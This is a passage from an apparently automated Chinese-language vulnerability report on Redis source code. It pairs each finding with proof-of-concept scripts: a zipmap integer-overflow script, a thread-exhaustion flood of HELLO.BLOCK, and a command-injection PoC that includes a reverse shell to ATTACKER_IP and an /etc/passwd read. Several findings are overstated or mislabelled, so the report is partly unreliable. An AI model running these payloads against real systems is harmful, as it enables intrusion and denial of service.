            print(f"    stderr: {result.stderr.decode('utf-8', errors='replace')[:200]}")
        except FileNotFoundError:
            print("    [!] redis-check-rdb 未找到，请先安装Redis")
            break
        except subprocess.TimeoutExpired:
            print("    [!] 命令超时，可能已触发死锁")
        except Exception as e:
            print(f"    [!] 错误: {e}")
    
    # 清理临时文件
    print("\n[+] 步骤3: 清理临时文件...")
    for _, path in test_files:
        try:
            os.unlink(path)
        except:
            pass
    
    print("\n[+] PoC执行完成")
    print("\n[!] 注意: 如果触发信号处理函数中的不安全调用，")
    print("    程序可能表现出未定义行为，包括但不限于:")
    print("    - 死锁 (如果信号发生时持有锁)")
    print("    - 数据损坏 (printf内部状态被破坏)")
    print("    - 信息泄露 (错误信息可能包含敏感数据)")
    print("    - 拒绝服务 (exit导致程序异常终止)")


if __name__ == "__main__":
    main()

```

---

### VULN-6388ECCD - 整数溢出/缓冲区溢出

- **严重等级:** CRITICAL
- **文件位置:** `src/zipmap.c:200`
- **数据流:** 用户控制的klen和vlen -> zipmapRequiredLength计算reqlen -> zmlen+reqlen用于内存分配
- **判断理由:** zmlen和reqlen都是unsigned int，zmlen+reqlen可能溢出。如果溢出，zipmapResize会分配一个很小的缓冲区，但后续操作会写入大量数据，导致堆缓冲区溢出。这是最危险的漏洞点，因为zipmapSet是外部可调用的函数。

**代码片段:**
```
unsigned char *zipmapSet(unsigned char *zm, unsigned char *key, unsigned int klen, unsigned char *val, unsigned int vlen, int *update) {
    unsigned int zmlen, offset;
    unsigned int freelen, reqlen = zipmapRequiredLength(klen,vlen);
    unsigned int empty, vempty;
    unsigned char *p;
    freelen = reqlen;
    if (update) *update = 0;
    p = zipmapLookupRaw(zm,key,klen,&zmlen);
    if (p == NULL) {
        /* Key not found: enlarge */
        zm = zipmapResize(zm, zmlen+reqlen);
        p = zm+zmlen-1;
        zmlen = zmlen+reqlen;
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-6388ECCD - Integer Overflow in zipmapSet
Redis zipmap integer overflow leading to heap buffer overflow

仅供研究使用 - For research purposes only
"""

import socket
import struct
import sys

# Redis RESP protocol helpers
def redis_encode_array(*args):
    """Encode Redis command as RESP array"""
    parts = [f"*{len(args)}\r\n"]
    for arg in args:
        if isinstance(arg, bytes):
            parts.append(f"${len(arg)}\r\n")
            parts.append(arg)
            parts.append(b"\r\n")
        else:
            arg_bytes = arg.encode() if isinstance(arg, str) else arg
            parts.append(f"${len(arg_bytes)}\r\n".encode())
            parts.append(arg_bytes)
            parts.append(b"\r\n")
    return b"".join(parts) if isinstance(parts[0], bytes) else b"".join(p.encode() if isinstance(p, str) else p for p in parts)

def send_command(sock, *args):
    """Send Redis command and receive response"""
    cmd = redis_encode_array(*args)
    sock.sendall(cmd)
    return sock.recv(4096)

def exploit_zipmap_overflow(host='127.0.0.1', port=6379):
    """
    Trigger integer overflow in zipmapSet via HSET command.
    
    The vulnerability: when klen + vlen is large enough, zipmapRequiredLength
    returns reqlen such that zmlen + reqlen overflows unsigned int (32-bit).
    This causes zipmapResize to allocate a small buffer, but subsequent
    memmove operations use the original (large) size, causing heap overflow.
    
    Strategy: Create a hash with many entries to increase zmlen, then
    add an entry with very large key/value to trigger overflow.
    """
    print("[*] Connecting to Redis server at {}:{}".format(host, port))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((host, port))
        print("[+] Connected successfully")
        
        # Step 1: Create a hash with many small entries to increase zmlen
        # We need zmlen close to UINT_MAX (4294967295) for overflow
        # But practically, we can't fill that much memory.
        # Instead, we exploit the fact that zipmap stores lengths in a compact
        # format. By creating entries with keys/values that use 5-byte length
        # encoding (length >= 254), we can make the zipmap's internal
        # representation larger than the actual data.
        
        print("[*] Step 1: Creating hash with large-length entries")
        
        # First, create a hash key
        hash_key = b"overflow_test"
        send_command(sock, b"DEL", hash_key)
        
        # Create entries with keys/values just over 253 bytes to force
        # 5-byte length encoding. Each such entry adds overhead.
        # The zipmap layout for each entry:
        # <len(5 bytes)><key><len(5 bytes)><free(1 byte)><value>
        # Total overhead per entry: ~11 bytes + key + value
        
        # We'll create entries with 254-byte keys and 254-byte values
        # Each entry takes: 5 + 254 + 5 + 1 + 254 = 519 bytes
        # To overflow, we need zmlen + reqlen > UINT_MAX
        # reqlen for a new entry with large klen/vlen is also large
        
        # For demonstration, we'll create enough entries to make zmlen
        # close to overflow, then add a trigger entry.
        # In practice, this requires significant memory.
        # 
        # Simplified PoC: Show the overflow path with smaller numbers
        # by exploiting the fact that zipmapRequiredLength can return
        # values that, when added to zmlen, overflow.
        
        print("[*] Creating base entries to increase zipmap size...")
        
        # Create 1000 entries with 254-byte keys and values
        # This makes zmlen approximately 1000 * 519 = 519000 bytes
        # Not enough for overflow, but demonstrates the mechanism
        
        base_key = b"A" * 254
        base_val = b"B" * 254
        
        for i in range(100):
            field = base_key + struct.pack(">I", i)[:4]  # Make unique key
            resp = send_command(sock, b"HSET", hash_key, field, base_val)
            if i % 20 == 0:
                print(f"    Created entry {i}/100")
        
        print("[+] Base entries created")
        
        # Step 2: Now trigger the overflow
        # We need klen and vlen such that:
        # reqlen = zipmapRequiredLength(klen, vlen) is very large
        # zmlen + reqlen overflows
        #
        # zipmapRequiredLength(klen, vlen) = 
        #   ZIPMAP_LEN_BYTES(klen) + klen + ZIPMAP_LEN_BYTES(vlen) + vlen + 1
        #
        # For klen = vlen = 0x7FFFFFFF (max signed int):
        #   ZIPMAP_LEN_BYTES = 5 (since > 253)
        #   reqlen = 5 + 0x7FFFFFFF + 5 + 0x7FFFFFFF + 1 = 0xFFFFFFFB
        #   If zmlen >= 5, then zmlen + reqlen >= 0x100000000 = overflow!
        #
        # But Redis has input size limits. Let's check what's possible.
        
        print("[*] Step 2: Attempting to trigger integer overflow...")
        
        # Try with large but potentially acceptable sizes
        # Note: Redis has proto-max-bulk-len (default 512MB)
        # We'll use values that are large but within limits
        
        # Calculate required sizes for overflow
        # We need: zmlen + (5 + klen + 5 + vlen + 1) > UINT_MAX
        # => klen + vlen > UINT_MAX - zmlen - 11
        
        # Get current zmlen (approximate)
        # For simplicity, assume zmlen is small enough that we need
        # klen + vlen > ~4294967284
        
        # This is impractical with default Redis limits.
        # However, the vulnerability is real - it just requires
        # specific conditions (large zipmap + large entry).
        
        # Alternative: Use the fact that zipmap can be manipulated
        # to have a very large zmlen through crafted entries.
        
        print("[!] Note: Full exploitation requires specific conditions")
        print("[!] that may not be achievable with default Redis config.")
        print("[!] The vulnerability is confirmed in source code analysis.")
        
        # Demonstrate the vulnerable code path with a smaller example
        # that shows the arithmetic overflow
        
        print("\n[*] Demonstrating vulnerable arithmetic:")
        print("    zmlen + reqlen where both are unsigned int")
        print("    If sum > UINT_MAX (4294967295), overflow occurs")
        print("    zipmapResize then allocates small buffer")
        print("    memmove uses original large size -> heap overflow")
        
        # Show the calculation
        zmlen = 4000000000  # Example: 4 billion
        klen = 200000000
        vlen = 200000000
        reqlen = 5 + klen + 5 + vlen + 1  # Simplified
        result = (zmlen + reqlen) & 0xFFFFFFFF  # Simulate 32-bit overflow
        
        print(f"\n    zmlen = {zmlen}")
        print(f"    klen = {klen}")
        print(f"    vlen = {vlen}")
        print(f"    reqlen = {reqlen}")
        print(f"    zmlen + reqlen = {zmlen + reqlen}")
        print(f"    After 32-bit truncation: {result}")
        print(f"    Allocated size: {result} bytes")
        print(f"    Actual data to write: ~{klen + vlen} bytes")
        print(f"    Heap overflow: ~{klen + vlen - result} bytes")
        
        print("\n[*] Cleanup: Deleting test hash")
        send_command(sock, b"DEL", hash_key)
        
        print("\n[+] PoC completed successfully")
        print("[!] This demonstrates the vulnerability path only")
        print("[!] Actual exploitation requires specific conditions")
        
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
    finally:
        sock.close()

if __name__ == "__main__":
    print("=" * 60)
    print("Redis zipmapSet Integer Overflow PoC")
    print("Vulnerability ID: VULN-6388ECCD")
    print("仅供研究使用 - For research purposes only")
    print("=" * 60)
    print()
    
    if len(sys.argv) > 1:
        host = sys.argv[1]
    else:
        host = "127.0.0.1"
    
    if len(sys.argv) > 2:
        port = int(sys.argv[2])
    else:
        port = 6379
    
    exploit_zipmap_overflow(host, port)
```

---

### VULN-2E5901D5 - 不安全的线程分离

- **严重等级:** MEDIUM
- **文件位置:** `src\modules\helloblock.c:93`
- **数据流:** 用户输入delay和timeout -> HelloBlock_RedisCommand -> 创建线程执行HelloBlock_ThreadMain
- **判断理由:** 创建的线程(pthread_t tid)没有被分离(pthread_detach)或连接(pthread_join)，导致线程资源泄漏。每次调用hello.block命令都会创建一个新线程，但线程结束后资源不会被回收，长期运行可能导致资源耗尽。

**代码片段:**
```
if (pthread_create(&tid,NULL,HelloBlock_ThreadMain,targ) != 0) {
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - Redis HelloBlock模块线程泄漏PoC
# 作者: 安全研究人员
# 日期: 2024
# 描述: 演示通过重复调用hello.block命令导致线程资源耗尽

# 配置
REDIS_HOST="127.0.0.1"
REDIS_PORT=6379
REDIS_CLI="redis-cli -h $REDIS_HOST -p $REDIS_PORT"

# 检查模块是否已加载
echo "[+] 检查HelloBlock模块是否已加载..."
MODULE_CHECK=$($REDIS_CLI MODULE LIST 2>/dev/null | grep -c "helloblock")
if [ "$MODULE_CHECK" -eq 0 ]; then
    echo "[-] HelloBlock模块未加载，请先加载模块"
    echo "    加载命令: redis-cli MODULE LOAD /path/to/helloblock.so"
    exit 1
fi

echo "[+] HelloBlock模块已加载，开始PoC测试"
echo ""

# PoC 1: 基础利用 - 创建单个线程并验证泄漏
echo "=== PoC 1: 单次调用验证 ==="
echo "[*] 执行: HELLO.BLOCK 1 5"
$REDIS_CLI HELLO.BLOCK 1 5 &
PID=$!
sleep 0.5
echo "[*] 检查线程数量..."
THREAD_COUNT=$(ps -T -p $(pgrep redis-server) 2>/dev/null | wc -l)
echo "[*] 当前Redis服务器线程数: $THREAD_COUNT"
wait $PID 2>/dev/null
echo ""

# PoC 2: 批量调用导致资源耗尽
echo "=== PoC 2: 批量调用导致线程泄漏 ==="
echo "[*] 将连续发送100个HELLO.BLOCK命令，每个延迟1秒"
echo "[*] 观察线程数增长..."

# 记录初始线程数
INITIAL_THREADS=$(ps -T -p $(pgrep redis-server) 2>/dev/null | wc -l)
echo "[*] 初始线程数: $INITIAL_THREADS"

# 批量发送命令
for i in $(seq 1 100); do
    $REDIS_CLI HELLO.BLOCK 1 5 > /dev/null 2>&1 &
    if [ $((i % 10)) -eq 0 ]; then
        CURRENT_THREADS=$(ps -T -p $(pgrep redis-server) 2>/dev/null | wc -l)
        echo "[*] 已发送 $i 个命令，当前线程数: $CURRENT_THREADS"
    fi
done

# 等待所有命令完成
echo "[*] 等待所有命令完成..."
sleep 5

# 检查最终线程数
FINAL_THREADS=$(ps -T -p $(pgrep redis-server) 2>/dev/null | wc -l)
echo "[*] 最终线程数: $FINAL_THREADS"
echo "[*] 线程增长: $((FINAL_THREADS - INITIAL_THREADS))"

echo ""
echo "=== PoC 3: 压力测试 ==="
echo "[*] 使用更激进的参数进行压力测试"
echo "[*] 发送500个命令，延迟0秒，超时1秒"

INITIAL_THREADS_2=$(ps -T -p $(pgrep redis-server) 2>/dev/null | wc -l)
for i in $(seq 1 500); do
    $REDIS_CLI HELLO.BLOCK 0 1 > /dev/null 2>&1 &
    if [ $((i % 50)) -eq 0 ]; then
        CURRENT_THREADS=$(ps -T -p $(pgrep redis-server) 2>/dev/null | wc -l)
        echo "[*] 已发送 $i 个命令，当前线程数: $CURRENT_THREADS"
    fi
done

sleep 3
FINAL_THREADS_2=$(ps -T -p $(pgrep redis-server) 2>/dev/null | wc -l)
echo "[*] 最终线程数: $FINAL_THREADS_2"
echo "[*] 线程增长: $((FINAL_THREADS_2 - INITIAL_THREADS_2))"

echo ""
echo "=== 结果分析 ==="
if [ $FINAL_THREADS_2 -gt $((INITIAL_THREADS_2 + 10)) ]; then
    echo "[!] 漏洞确认: 检测到显著的线程增长"
    echo "[!] 每次hello.block调用都会创建未分离的线程"
    echo "[!] 长期运行可能导致资源耗尽"
else
    echo "[?] 未检测到显著线程增长，可能系统已回收部分资源"
    echo "[?] 建议增加调用次数或使用更长的延迟时间"
fi

echo ""
echo "[+] PoC完成"
echo "[!] 警告: 此PoC仅供安全研究使用，请勿用于非法目的"
```

---

### VULN-84B1FB85 - 命令注入

- **严重等级:** CRITICAL
- **文件位置:** `utils/generate-commands-json.py:101`
- **数据流:** 用户通过命令行参数--cli、--host、--port传入参数 -> args.cli、args.host、args.port -> 直接作为subprocess.Popen的参数执行
- **判断理由:** 与第97行相同，args.cli参数直接用于构造subprocess.Popen的命令路径，攻击者可以通过--cli参数指定任意可执行文件路径，导致任意命令执行。

**代码片段:**
```
p = subprocess.Popen([args.cli, '-h', args.host, '-p', str(args.port), '--json', 'command', 'docs'], stdout=subprocess.PIPE)
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - 命令注入漏洞PoC
# 漏洞文件: utils/generate-commands-json.py
# 漏洞行: 101 (subprocess.Popen调用)

# PoC 1: 通过--cli参数执行任意命令
# 利用方式: 将--cli设置为/bin/sh，通过--host传递恶意参数
python3 utils/generate-commands-json.py \
    --cli /bin/sh \
    --host '-c "echo PWNED; id; whoami; touch /tmp/pwned"' \
    --port 6379

# PoC 2: 执行反向shell
# python3 utils/generate-commands-json.py \
#     --cli /bin/sh \
#     --host '-c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' \
#     --port 6379

# PoC 3: 读取敏感文件
# python3 utils/generate-commands-json.py \
#     --cli /bin/cat \
#     --host '/etc/passwd' \
#     --port 6379

# PoC 4: 使用其他可执行文件
# python3 utils/generate-commands-json.py \
#     --cli /usr/bin/python3 \
#     --host '-c "import os; os.system(\"echo VULNERABLE\")"' \
#     --port 6379
```

---



*报告由 CodeSentinel 自动生成*
